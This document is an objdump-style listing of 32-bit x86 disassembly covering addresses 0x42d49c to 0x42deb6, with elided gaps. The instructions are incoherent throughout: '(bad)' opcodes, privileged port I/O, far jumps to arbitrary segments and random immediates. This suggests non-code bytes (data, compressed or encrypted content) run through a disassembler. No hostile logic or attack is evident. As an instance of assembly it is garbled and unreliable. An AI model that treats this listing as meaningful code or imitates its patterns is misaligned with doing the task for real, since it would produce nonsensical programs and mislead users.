  42d49c:	rcl    BYTE PTR [ebx-0x4a],cl
  42d49f:	xor    DWORD PTR [edi-0x2c069a1],edi
  42d4a5:	ja     0x42d439
  42d4a7:	lods   eax,DWORD PTR ds:[esi]
  42d4a8:	mov    bh,0x17
  42d4aa:	inc    ebx
  42d4ab:	jbe    0x42d469
  42d4ad:	inc    esp
  42d4ae:	jg     0x42d445
  42d4b0:	es dec edi
  42d4b2:	xor    eax,DWORD PTR [ebx]
  42d4b4:	sahf   
  42d4b5:	pop    ds
  42d4b6:	outs   dx,BYTE PTR ds:[esi]
  42d4b7:	repnz cs sbb ebx,eax
  42d4bb:	jecxz  0x42d4f1
  42d4bd:	lods   al,BYTE PTR ds:[esi]
  42d4be:	dec    edx
  42d4bf:	sbb    al,0x4d
  42d4c1:	or     ch,BYTE PTR [eax]
  42d4c3:	scas   al,BYTE PTR es:[edi]
  42d4c4:	adc    al,0x37
  42d4c6:	sbb    eax,0x2dc69d14
  42d4cb:	dec    ecx
  42d4cc:	ds inc esi
  42d4ce:	jmp    0x42d53f
  42d4d0:	sub    eax,DWORD PTR [eax-0x1d]
  42d4d3:	push   ecx
  42d4d4:	or     bl,dl
  42d4d6:	cwde   
  42d4d7:	imul   ecx,edi,0x442e7f7a
  42d4dd:	dec    ebx
  42d4de:	adc    DWORD PTR [eax],edx
  42d4e0:	xor    edi,DWORD PTR ds:0xa168870b
  42d4e6:	or     al,0xf3
  42d4e8:	lds    edi,FWORD PTR [ebp+edx*2+0x48eb120c]
  42d4ef:	xor    DWORD PTR [edi-0x6a],edi
  42d4f2:	mov    dl,ch
  42d4f4:	jle    0x42d53d
  42d4f6:	imul   esi,DWORD PTR [edx],0xe24e2199
  42d4fc:	stos   BYTE PTR es:[edi],al
  42d4fd:	sub    DWORD PTR [edi-0x62f74dfd],edi
  42d503:	popa   
  42d504:	(bad)  
  42d505:	out    dx,eax
  42d506:	mov    dl,0x62
  42d508:	push   ds
  42d509:	loopne 0x42d515
  42d50b:	adc    BYTE PTR [ebx],bl
  42d50d:	or     cl,BYTE PTR [edi+0x52fa]
	...
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xb7893d5,eax
  42d583:	inc    ebx
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xea000001,al
  42d58d:	mov    ds,WORD PTR [ebx+0x46]
  42d590:	inc    edi
  42d591:	push   0x31
  42d593:	fucomip st,st(6)
  42d595:	mov    ch,0x9
  42d597:	xchg   DWORD PTR [ecx+eax*8-0x1fb98000],edi
  42d59e:	sbb    esp,edx
  42d5a0:	or     esp,DWORD PTR [edi]
  42d5a2:	jb     0x42d59d
  42d5a4:	jmp    0x33b241e5
  42d5a9:	mov    bl,0x9f
  42d5ab:	out    0xf8,eax
  42d5ad:	in     eax,0x13
  42d5af:	sub    BYTE PTR [eax+0x1e],0x95
  42d5b3:	xchg   DWORD PTR [esi],ecx
  42d5b5:	mov    WORD PTR [ecx-0x52],fs
  42d5b8:	adc    al,0x23
  42d5ba:	or     BYTE PTR [esi-0x35],al
  42d5bd:	or     BYTE PTR cs:0xa2293197,bh
  42d5c4:	sbb    ch,bh
  42d5c6:	adc    ch,ch
  42d5c8:	out    dx,eax
  42d5c9:	not    BYTE PTR [esp-0x6f]
  42d5cd:	adc    eax,0xacb1a868
  42d5d2:	(bad)  
  42d5d3:	mov    fs:0xbcf0137f,al
  42d5d9:	xchg   esp,eax
  42d5da:	xor    eax,0x8320d5e5
  42d5df:	aaa    
  42d5e0:	dec    ebp
  42d5e1:	xor    edi,ecx
  42d5e3:	and    esi,DWORD PTR [ebx+0x27a44f80]
  42d5e9:	jb     0x42d585
  42d5eb:	mov    bh,dh
  42d5ed:	icebp  
  42d5ee:	je     0x42d642
  42d5f0:	push   ebx
  42d5f1:	daa    
  42d5f2:	test   BYTE PTR [esi+0x352ba6ed],bh
  42d5f8:	xor    BYTE PTR [edx-0x26],dl
  42d5fb:	in     al,dx
  42d5fc:	arpl   WORD PTR [edi],cx
  42d5fe:	pop    eax
  42d5ff:	pop    esp
  42d600:	or     eax,DWORD PTR ds:0xb9b881b8
  42d606:	imul   ebx,DWORD PTR [eax+0x4520cc90],0x4366b027
  42d610:	imul   edx,DWORD PTR [ecx],0xffffff84
  42d613:	xor    cl,BYTE PTR [ecx]
  42d615:	add    DWORD PTR [eax],ebx
  42d617:	adc    bl,BYTE PTR [ebx]
  42d619:	lock dec esp
  42d61b:	in     eax,dx
  42d61c:	cmp    esp,ebp
  42d61e:	icebp  
  42d61f:	out    0x81,al
  42d621:	les    eax,FWORD PTR [edi+0x6d]
  42d624:	push   0x1b
  42d626:	mov    DWORD PTR [edx],ebp
  42d628:	stc    
  42d629:	outs   dx,BYTE PTR ds:[esi]
  42d62a:	mov    bl,0x22
  42d62c:	mov    esp,0x955d6b9f
  42d631:	clc    
  42d632:	mov    ecx,0xb988f4b5
  42d637:	jo     0x42d634
  42d639:	or     BYTE PTR [esi+edi*1],bh
  42d63c:	sub    edi,eax
  42d63e:	mov    esp,eax
  42d640:	outs   dx,BYTE PTR ds:[esi]
  42d641:	div    bh
  42d643:	cmp    cl,cl
  42d645:	lea    esi,[ebp-0x5c]
  42d648:	mov    al,0xeb
  42d64a:	in     eax,0xcf
  42d64c:	int    0xdc
  42d64e:	adc    DWORD PTR [eax+ecx*4+0x2],edx
  42d652:	stos   DWORD PTR es:[edi],eax
  42d653:	pop    eax
  42d654:	out    dx,eax
  42d655:	inc    ecx
  42d656:	jg     0x42d5ef
  42d658:	dec    edx
  42d659:	pop    ecx
  42d65a:	xchg   esp,eax
  42d65b:	sbb    DWORD PTR [ebp+0x1d],ebp
  42d65e:	neg    DWORD PTR [esi-0x71]
  42d661:	xchg   ebp,eax
  42d662:	ins    BYTE PTR es:[edi],dx
  42d663:	test   BYTE PTR [edi-0x4b502067],cl
  42d669:	inc    eax
  42d66a:	push   0x2c
  42d66c:	scas   eax,DWORD PTR es:[edi]
  42d66d:	fadd   st,st(5)
  42d66f:	mov    cl,0x4
  42d671:	and    eax,0x3c4c429d
  42d676:	sub    ebp,DWORD PTR [edx+0x649e4fe8]
  42d67c:	push   es
  42d67d:	mov    ebx,0x6d93b8b1
  42d682:	popa   
  42d683:	xchg   edi,eax
  42d684:	mov    DWORD PTR [edx],esp
  42d686:	jnp    0x42d667
  42d688:	mov    ecx,0xabee273
  42d68d:	in     eax,0xbc
  42d68f:	push   edi
  42d690:	mov    BYTE PTR [eax],al
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x1f
  42d701:	adc    BYTE PTR [ecx+0x1e72cb1],dh
  42d707:	add    BYTE PTR ds:0x4000001,al
  42d70d:	jno    0x42d6db
  42d70f:	add    eax,0xd7dd0362
  42d714:	pop    es
  42d715:	out    0x2f,eax
  42d717:	sbb    ebx,DWORD PTR [edi+0x679735a4]
  42d71d:	push   eax
  42d71e:	sbb    al,0x61
  42d720:	out    dx,al
  42d721:	xor    DWORD PTR ds:0xc5655502,esp
  42d727:	arpl   ax,bx
  42d729:	aad    0x48
  42d72b:	xor    cl,ah
  42d72d:	sbb    ch,BYTE PTR [edi+edx*1]
  42d730:	aas    
  42d731:	and    al,0x8
  42d733:	mov    ebx,0xaa3d9a34
  42d738:	mov    ch,0x6
  42d73a:	or     al,0xae
  42d73c:	cdq    
  42d73d:	jecxz  0x42d752
  42d73f:	les    edx,FWORD PTR [edi+0x11]
  42d742:	aas    
  42d743:	pop    esi
  42d744:	out    dx,al
  42d745:	adc    DWORD PTR [esi+edi*2],ecx
  42d748:	mov    ecx,0xe0251098
  42d74d:	pushf  
  42d74e:	(bad)  
  42d74f:	pop    ebp
  42d750:	pop    ecx
  42d751:	leave  
  42d752:	pop    ds
  42d753:	mul    ebx
  42d755:	imul   edi,DWORD PTR [esi+0x3a],0x458e89ad
  42d75c:	out    dx,eax
  42d75d:	add    edx,DWORD PTR [ebp+0x11]
  42d760:	std    
  42d761:	cmp    ah,BYTE PTR [edx]
  42d763:	sub    dh,bh
  42d765:	aas    
  42d766:	pop    esi
  42d767:	dec    ebx
  42d768:	arpl   WORD PTR [eax-0x51],ax
  42d76b:	jmp    0x2a23:0x7cd99752
  42d772:	in     al,0x8e
  42d774:	dec    esp
  42d775:	add    cl,BYTE PTR [ecx-0xf2211ff]
  42d77b:	call   0x9082:0xed7ea659
  42d782:	sti    
  42d783:	jbe    0x42d7ca
  42d785:	call   ebp
  42d787:	cs gs xchg edi,eax
  42d78a:	int3   
  42d78b:	je     0x42d71d
  42d78d:	stos   DWORD PTR es:[edi],eax
  42d78e:	push   esi
  42d78f:	outs   dx,DWORD PTR ds:[esi]
  42d790:	(bad)  
  42d791:	jns    0x42d7bf
  42d793:	outs   dx,BYTE PTR ds:[esi]
  42d794:	fcmovbe st,st(3)
  42d796:	mov    WORD PTR [eax-0x68],?
  42d799:	cmp    DWORD PTR [edx-0x36],ebx
  42d79c:	mov    edx,0xb4a9243c
  42d7a1:	jb     0x42d7c7
  42d7a3:	cmp    al,0x6c
  42d7a5:	pop    ebp
  42d7a6:	loopne 0x42d7a3
  42d7a8:	cld    
  42d7a9:	push   edi
  42d7aa:	xor    dl,dh
  42d7ac:	push   cs
  42d7ad:	mov    edi,DWORD PTR [ebx+0x5c]
  42d7b0:	enter  0x9b72,0xe0
  42d7b4:	ja     0x42d783
  42d7b6:	ds jmp 0xc83d:0x9ed79c18
  42d7be:	push   esp
  42d7bf:	xchg   BYTE PTR [edx+edx*4+0x79],cl
  42d7c3:	xchg   ebp,eax
  42d7c4:	(bad)  
  42d7c5:	fld    QWORD PTR [ebp+0x3478b06c]
  42d7cb:	cdq    
  42d7cc:	int    0x86
  42d7ce:	xor    al,0xac
  42d7d0:	pop    ecx
  42d7d1:	cmp    cl,al
  42d7d3:	mov    ebp,0x22b7bbe8
  42d7d8:	push   edi
  42d7d9:	mov    bl,0xfe
  42d7db:	dec    ebp
  42d7dc:	xchg   BYTE PTR [edi+0x3f49a69e],dl
  42d7e2:	pop    edx
  42d7e3:	call   0xdd3:0x6e093b0d
  42d7ea:	and    al,0x5b
  42d7ec:	lods   eax,DWORD PTR ds:[esi]
  42d7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7ee:	ds cmc 
  42d7f0:	ret    0x61f2
  42d7f3:	xor    eax,0x21e9bf7e
  42d7f8:	outs   dx,BYTE PTR ds:[esi]
  42d7f9:	enter  0xc331,0x48
  42d7fd:	xchg   esi,eax
  42d7fe:	and    BYTE PTR [edx-0x8],dl
  42d801:	sub    eax,0xe4e13666
  42d806:	push   cs
  42d807:	out    0xaa,eax
  42d809:	jecxz  0x42d84f
  42d80b:	push   edi
  42d80c:	mov    esp,0xd257e8f0
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x53c6961a
  42d881:	iret   
  42d882:	(bad)  
  42d883:	mov    dh,BYTE PTR [ecx]
  42d885:	call   0x147d88b
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	xchg   ebx,eax
  42d88d:	inc    edx
  42d88e:	shr    DWORD PTR [ebx+ebx*4],1
  42d891:	push   ebx
  42d892:	stos   BYTE PTR es:[edi],al
  42d893:	loope  0x42d892
  42d895:	popf   
  42d896:	push   0x88af34ab
  42d89b:	in     eax,0xe0
  42d89d:	mov    edx,0x94e7a04f
  42d8a2:	fnstsw WORD PTR ds:0x3783552c
  42d8a8:	mov    ebp,0xea19bf08
  42d8ad:	popa   
  42d8ae:	or     edx,ecx
  42d8b0:	stos   BYTE PTR es:[edi],al
  42d8b1:	add    edx,ecx
  42d8b3:	pusha  
  42d8b4:	repz add eax,0xe30652e9
  42d8ba:	or     al,0xcf
  42d8bc:	jb     0x42d900
  42d8be:	adc    edi,DWORD PTR [ebp+eiz*1+0x6a]
  42d8c2:	jne    0x42d8f7
  42d8c4:	jle    0x42d90c
  42d8c6:	je     0x42d8e6
  42d8c8:	jge    0x42d865
  42d8ca:	xchg   BYTE PTR [edi],ch
  42d8cc:	add    DWORD PTR es:[edx],esi
  42d8cf:	int    0x1f
  42d8d1:	lods   eax,DWORD PTR ds:[esi]
  42d8d2:	(bad)  
  42d8d3:	ja     0x42d869
  42d8d5:	jbe    0x42d8a8
  42d8d7:	sub    al,0x28
  42d8d9:	pop    DWORD PTR [esi+0x1234fe78]
  42d8df:	retf   
  42d8e0:	jmp    0xb79b9f9d
  42d8e5:	ret    0x3e04
  42d8e8:	mov    bl,0xd0
  42d8ea:	(bad)  
  42d8eb:	mov    edi,0xbfd827dc
  42d8f0:	push   ds
  42d8f1:	lea    edi,[edi+0x37]
  42d8f4:	pop    es
  42d8f5:	push   cs
  42d8f6:	xor    al,0xc9
  42d8f8:	data16 ja 0x42d934
  42d8fb:	outs   dx,BYTE PTR ds:[esi]
  42d8fc:	add    BYTE PTR ds:0x3a841a2e,dl
  42d902:	fs mov al,ss:0xac29c64f
  42d909:	gs pop ss
  42d90b:	inc    edi
  42d90c:	pusha  
  42d90d:	fdiv   DWORD PTR [eax+0x75cea993]
  42d913:	fisttp WORD PTR [ebx]
  42d915:	lods   eax,DWORD PTR ds:[esi]
  42d916:	ins    DWORD PTR es:[edi],dx
  42d917:	mov    ch,0xc8
  42d919:	lahf   
  42d91a:	or     edi,DWORD PTR [edi-0x73bf2e65]
  42d920:	les    edx,FWORD PTR [ebp+0x6df35aad]
  42d926:	not    DWORD PTR [ebx+0x429e099]
  42d92c:	xchg   BYTE PTR [esp+edi*1-0xb449b44],cl
  42d933:	cdq    
  42d934:	jle    0x42d9a4
  42d936:	mov    edx,0x8afadd41
  42d93b:	ret    0xd303
  42d93e:	xchg   edx,eax
  42d93f:	push   es
  42d940:	sysexit 
  42d942:	xchg   ecx,eax
  42d943:	push   0xb
  42d945:	test   eax,0x49d4b420
  42d94a:	push   eax
  42d94b:	sar    BYTE PTR [eax-0x7e],cl
  42d94e:	loope  0x42d95d
  42d950:	nop
  42d951:	aaa    
  42d952:	loop   0x42d92d
  42d954:	push   edx
  42d955:	xchg   esp,eax
  42d956:	add    ebx,DWORD PTR [ebp+0xb740364]
  42d95c:	xlat   BYTE PTR ds:[ebx]
  42d95d:	cmp    al,0x69
  42d95f:	jmp    0x5576:0x95c2a498
  42d966:	fucom  st(0)
  42d968:	xchg   ecx,eax
  42d969:	into   
  42d96a:	mov    DWORD PTR [ebx],eax
  42d96c:	inc    ecx
  42d96d:	or     DWORD PTR [eax+0x48],ebx
  42d970:	aas    
  42d971:	xchg   edi,eax
  42d972:	push   edx
  42d973:	dec    esp
  42d974:	mov    ebx,0x82482d74
  42d979:	mov    cl,0x5f
  42d97b:	loopne 0x42d9bf
  42d97d:	(bad)  
  42d97e:	jle    0x42d92d
  42d980:	test   al,0xe
  42d982:	ret    
  42d983:	sar    DWORD PTR [edx-0x53a31446],cl
  42d989:	shl    BYTE PTR [edi+0x6bf88e4e],0x95
  42d990:	repnz add BYTE PTR [eax],al
	...
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	jbe    0x42d995
  42da02:	faddp  st(0),st
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	inc    edi
  42da0d:	into   
  42da0e:	xchg   ebp,eax
  42da0f:	popf   
  42da10:	mov    dh,0x3d
  42da12:	stos   DWORD PTR es:[edi],eax
  42da13:	outs   dx,BYTE PTR ds:[esi]
  42da14:	cmc    
  42da15:	shr    DWORD PTR [ebp-0x5b25c2f9],1
  42da1b:	dec    ebp
  42da1c:	pop    es
  42da1d:	aam    0x4f
  42da1f:	icebp  
  42da20:	jmp    0x42d9c0
  42da22:	xchg   esi,eax
  42da23:	retf   0x2316
  42da26:	test   DWORD PTR [eax-0x7b54f9c9],esi
  42da2c:	sbb    edi,DWORD PTR [esp+0x6d18e7d8]
  42da33:	inc    esp
  42da34:	bound  esp,QWORD PTR [bx]
  42da37:	xor    ebx,DWORD PTR [ebx+0x36]
  42da3a:	(bad)  
  42da3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da3d:	int3   
  42da3e:	hlt    
  42da3f:	xchg   ebp,eax
  42da40:	dec    esp
  42da41:	xor    DWORD PTR [edi],0xd1500608
  42da47:	nop
  42da48:	fbstp  TBYTE PTR ss:[ebp-0xe9121af]
  42da4f:	push   esp
  42da50:	xchg   edx,eax
  42da51:	xchg   dh,dl
  42da53:	cwde   
  42da54:	repz fild QWORD PTR [esi+0x5df2e7c5]
  42da5b:	xchg   ebp,eax
  42da5c:	xor    al,0x97
  42da5e:	xlat   BYTE PTR ds:[ebx]
  42da5f:	sbb    DWORD PTR [edi],ebp
  42da61:	or     ecx,DWORD PTR [ecx-0x1dfe5145]
  42da67:	mov    ah,0x88
  42da69:	xchg   DWORD PTR [edx-0x3b170bc],ebp
  42da6f:	add    edi,DWORD PTR [edi-0x4578551b]
  42da75:	mov    esp,0x1548bfb6
  42da7a:	add    al,0x17
  42da7c:	sub    eax,0x6128819
  42da81:	or     dh,bh
  42da83:	dec    esp
  42da84:	icebp  
  42da85:	sbb    DWORD PTR [eax],esi
  42da87:	push   edi
  42da88:	jge    0x42da6d
  42da8a:	cmc    
  42da8b:	mov    ds:0xa83ea4bf,al
  42da90:	(bad)  
  42da91:	push   esp
  42da92:	mov    dl,0x5
  42da94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da95:	xor    eax,0xef5e8667
  42da9a:	cmc    
  42da9b:	mov    ebp,0xe9f7e3c
  42daa1:	out    dx,al
  42daa2:	aas    
  42daa3:	(bad)  
  42daa4:	pop    ebp
  42daa5:	mov    cl,0xb1
  42daa7:	jmp    0xcf7ff7c3
  42daac:	cwde   
  42daad:	inc    esi
  42daae:	sbb    BYTE PTR [esi],ah
  42dab0:	push   eax
  42dab1:	nop
  42dab2:	mov    ch,0xd1
  42dab4:	inc    esi
  42dab5:	sub    bh,BYTE PTR [ebp+0x54]
  42dab8:	into   
  42dab9:	fild   QWORD PTR [ebx-0x2]
  42dabc:	repnz stos BYTE PTR es:[edi],al
  42dabe:	mov    edx,0x44747ac6
  42dac3:	les    ebx,FWORD PTR [eax]
  42dac5:	test   eax,0x8dbe4e33
  42daca:	jmp    0xd192be12
  42dacf:	fild   WORD PTR [ecx+0x61]
  42dad2:	aas    
  42dad3:	rcr    DWORD PTR [edx+edx*8+0xa],cl
  42dad7:	push   0x275aab48
  42dadc:	jns    0x42db5c
  42dade:	mov    eax,0xf865b33
  42dae3:	lahf   
  42dae4:	pusha  
  42dae5:	cmp    ebx,DWORD PTR [ecx+ebp*1+0x48]
  42dae9:	pop    ebp
  42daea:	scas   eax,DWORD PTR es:[edi]
  42daeb:	push   edi
  42daec:	retf   0x6a99
  42daef:	outs   dx,DWORD PTR ds:[esi]
  42daf0:	mov    cl,0x51
  42daf2:	lock jo 0x42db48
  42daf5:	cs mov ch,0xc4
  42daf8:	popa   
  42daf9:	dec    esp
  42dafa:	mov    ds:0xfc25102b,eax
  42daff:	and    al,0xb2
  42db01:	sub    BYTE PTR [esp+edi*8-0x5f],cl
  42db05:	fcomp  DWORD PTR [edx-0x332de179]
  42db0b:	cmp    DWORD PTR [edx],ebx
  42db0d:	sub    BYTE PTR [ebx+edx*4+0x9f],bl
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db3b
  42db81:	and    DWORD PTR [ecx+0x1ea3b2f],edi
  42db87:	add    BYTE PTR ds:0x15000001,al
  42db8d:	nop
  42db8e:	adc    BYTE PTR [edx-0x31],0x3d
  42db92:	sbb    al,0x7f
  42db94:	jg     0x42dc05
  42db96:	push   ebx
  42db97:	jmp    0x16d9:0x23e505c5
  42db9e:	xlat   BYTE PTR ds:[ebx]
  42db9f:	mov    ds:0x853338e0,al
  42dba4:	aaa    
  42dba5:	in     al,0xcf
  42dba7:	imul   edi,esp,0x5e
  42dbaa:	cmp    eax,0xa500d36f
  42dbaf:	loopne 0x42dc06
  42dbb1:	xor    ebp,DWORD PTR [ebp-0x1eaf2b20]
  42dbb7:	jl     0x42dbd9
  42dbb9:	pop    ds
  42dbba:	and    BYTE PTR [ebx-0x29],al
  42dbbd:	icebp  
  42dbbe:	inc    ecx
  42dbbf:	push   ss
  42dbc0:	stos   DWORD PTR es:[edi],eax
  42dbc1:	push   ds
  42dbc2:	pop    ds
  42dbc3:	push   esi
  42dbc4:	sbb    bh,al
  42dbc6:	xchg   edx,eax
  42dbc7:	gs push ecx
  42dbc9:	aam    0xf0
  42dbcb:	pop    esi
  42dbcc:	pop    es
  42dbcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbce:	mov    WORD PTR [ecx-0x1d],ds
  42dbd1:	lods   al,BYTE PTR ds:[esi]
  42dbd2:	call   0x397b80fb
  42dbd7:	inc    eax
  42dbd8:	xchg   DWORD PTR [ebp-0x77],ebx
  42dbdb:	mov    esi,0x7405825d
  42dbe0:	jl     0x42dbd7
  42dbe2:	jecxz  0x42db71
  42dbe4:	les    ebp,FWORD PTR [eax+0x37]
  42dbe7:	fwait
  42dbe8:	hlt    
  42dbe9:	hlt    
  42dbea:	sbb    DWORD PTR [ebp-0x4ff32aae],0x18
  42dbf1:	rcr    DWORD PTR [eax+0x5dbf858],0x86
  42dbf8:	inc    esp
  42dbf9:	mov    cl,BYTE PTR [ecx+0x4c]
  42dbfc:	push   0x23f95297
  42dc01:	mov    ebp,0xb8e1627
  42dc06:	jb     0x42dc6c
  42dc08:	xor    al,0x32
  42dc0a:	or     DWORD PTR [ebx+0x47],eax
  42dc0d:	dec    edx
  42dc0e:	call   0x3ebb5552
  42dc13:	or     al,BYTE PTR [edx+0x19d446da]
  42dc19:	std    
  42dc1a:	or     bl,BYTE PTR [eax]
  42dc1c:	std    
  42dc1d:	push   cs
  42dc1e:	cdq    
  42dc1f:	cli    
  42dc20:	cmp    al,0x58
  42dc22:	cld    
  42dc23:	lods   al,BYTE PTR ds:[esi]
  42dc24:	cli    
  42dc25:	setp   BYTE PTR [edx]
  42dc28:	jle    0x42dbcd
  42dc2a:	cmp    DWORD PTR [edi-0x56],esp
  42dc2d:	scas   al,BYTE PTR es:[edi]
  42dc2e:	push   ds
  42dc2f:	add    DWORD PTR [ecx+0x32],edx
  42dc32:	(bad)  
  42dc33:	out    dx,eax
  42dc34:	cwde   
  42dc35:	mov    ds:0x98d7480d,eax
  42dc3a:	xor    DWORD PTR [ecx+ebp*8-0xb],edx
  42dc3e:	and    al,0xe2
  42dc40:	fucomp st(4)
  42dc42:	cmp    BYTE PTR [ebx],0xbd
  42dc45:	nop
  42dc46:	mov    cl,0x78
  42dc48:	sbb    DWORD PTR [edx-0x76],0x922ab275
  42dc4f:	test   BYTE PTR [ecx+0x2e8bb6ea],dh
  42dc55:	enter  0x2233,0xee
  42dc59:	push   0xa192a32d
  42dc5e:	aad    0xb5
  42dc60:	mov    edx,0x5c7feaac
  42dc65:	fidiv  DWORD PTR [ebp+0x74cb08bd]
  42dc6b:	into   
  42dc6c:	inc    eax
  42dc6d:	test   al,0x2f
  42dc6f:	xchg   edi,eax
  42dc70:	shl    BYTE PTR [ebx-0x47],0xc4
  42dc74:	adc    al,0xaa
  42dc76:	div    DWORD PTR [ecx]
  42dc78:	mov    ds:0xa4675954,al
  42dc7d:	icebp  
  42dc7e:	mov    WORD PTR ds:0x8f4b6b05,es
  42dc84:	fist   WORD PTR [ecx+0x53]
  42dc87:	xchg   esi,eax
  42dc88:	mov    al,ds:0xfcd0cc4d
  42dc8d:	ins    DWORD PTR es:[edi],dx
  42dc8e:	in     eax,0xef
  42dc90:	dec    esp
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	dec    DWORD PTR [eax+eiz*8]
  42dd03:	mov    BYTE PTR [eax-0x15],0x1
  42dd07:	add    BYTE PTR ds:0x9f000001,al
  42dd0d:	and    bl,BYTE PTR [edi+0x13597f98]
  42dd13:	pop    ecx
  42dd14:	mov    esp,0xaeb66d05
  42dd19:	adc    cl,BYTE PTR [ebp+edi*4+0x3a06dc11]
  42dd20:	mov    esi,0x5d1721ab
  42dd25:	gs stos DWORD PTR es:[edi],eax
  42dd27:	mov    ds:0xb27b4870,al
  42dd2c:	mov    dh,0x54
  42dd2e:	loop   0x42dd44
  42dd30:	dec    eax
  42dd31:	mov    edx,0x49d74b0b
  42dd36:	pop    esi
  42dd37:	gs pop ss
  42dd39:	rcr    BYTE PTR [esi],0x42
  42dd3c:	mov    eax,DWORD PTR [esi+0x59]
  42dd3f:	jbe    0x42dd14
  42dd41:	mov    dl,dh
  42dd43:	jnp    0x42dcd5
  42dd45:	test   al,ch
  42dd47:	jo     0x42dd4b
  42dd49:	outs   dx,DWORD PTR ds:[esi]
  42dd4a:	xor    eax,0xe025e903
  42dd4f:	lds    edi,FWORD PTR [eax+0x7e71e290]
  42dd55:	mov    dl,0xc7
  42dd57:	xchg   esp,eax
  42dd58:	inc    edx
  42dd59:	sub    eax,0xe035f7cb
  42dd5e:	(bad)  
  42dd60:	cmp    bh,BYTE PTR [eax]
  42dd62:	enter  0xcded,0xae
  42dd66:	jo     0x42dd9b
  42dd68:	daa    
  42dd69:	fs dec eax
  42dd6b:	mov    esi,0x521b0f88
  42dd70:	fcomp  DWORD PTR [ebp-0x40]
  42dd73:	push   ebp
  42dd74:	mov    edx,0x17cfeec2
  42dd79:	pop    ecx
  42dd7a:	or     al,0x2e
  42dd7c:	gs jp  0x42ddc5
  42dd7f:	pusha  
  42dd80:	and    eax,0x43c096c2
  42dd85:	sub    ecx,DWORD PTR [ecx+0x6e843745]
  42dd8b:	jecxz  0x42dd91
  42dd8d:	mov    ecx,0x6230a05a
  42dd92:	ins    DWORD PTR es:[edi],dx
  42dd93:	fbld   TBYTE PTR [ebp+0x19]
  42dd96:	mov    BYTE PTR ds:[esi-0x50935e2a],dl
  42dd9d:	add    eax,0xeeca59d8
  42dda2:	pop    ss
  42dda3:	sbb    BYTE PTR [edi-0x33],bh
  42dda6:	(bad)  
  42dda7:	adc    al,0xa4
  42dda9:	jmp    0x48c7f0c4
  42ddae:	call   0x3685eae6
  42ddb3:	adc    al,0x9b
  42ddb5:	fsub   DWORD PTR [ebp-0x35dd9c55]
  42ddbb:	std    
  42ddbc:	neg    DWORD PTR [ebx+0x7c]
  42ddbf:	or     DWORD PTR [edi+0x6d17319c],esi
  42ddc5:	dec    esi
  42ddc6:	in     eax,dx
  42ddc7:	jo     0x42de30
  42ddc9:	imul   esi,DWORD PTR [ecx],0xb12c5fbc
  42ddcf:	sbb    BYTE PTR [ebx-0x3f],0x2f
  42ddd3:	sub    al,BYTE PTR [esi+ebp*1+0x753cb1ce]
  42ddda:	mov    ebp,0xe7b587aa
  42dddf:	sahf   
  42dde0:	data16 (bad) 
  42dde2:	les    eax,FWORD PTR [eax+0x5d444770]
  42dde8:	add    bh,ch
  42ddea:	repz bound eax,QWORD PTR [eax]
  42dded:	mov    eax,ds:0xea71c211
  42ddf2:	ss sbb eax,ebp
  42ddf5:	outs   dx,BYTE PTR ds:[esi]
  42ddf6:	(bad)  
  42ddf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ddf8:	xor    al,BYTE PTR [ecx]
  42ddfa:	xchg   edi,eax
  42ddfb:	(bad)  [ecx+0x3b085832]
  42de01:	sbb    BYTE PTR [esi+0x14094380],bh
  42de07:	mov    ds:0xfa609ba8,eax
  42de0c:	nop
  42de0d:	mov    ebx,DWORD PTR [edx-0x63]
  42de10:	mov    ebp,0x0
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	aam    0xbe
  42de82:	sub    al,0x99
  42de84:	inc    ebp
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0xa5000001
  42de8d:	es gs cmp BYTE PTR es:[edi],ch
  42de92:	pop    ds
  42de93:	cmp    al,0x2f
  42de95:	stc    
  42de96:	add    dl,BYTE PTR [ebx-0x5a]
  42de99:	repnz or BYTE PTR [edx+0x29],dh
  42de9d:	lds    ebx,FWORD PTR [ebx+0x76]
  42dea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dea1:	pop    es
  42dea2:	sar    BYTE PTR [edi-0x3a8897ad],0xa2
  42dea9:	jp     0x42debc
  42deab:	inc    ecx
  42deac:	aam    0x0
  42deae:	mov    esi,0xe42f23f7
  42deb3:	imul   BYTE PTR [ecx+ecx*8]
  42deb6:	lahf   
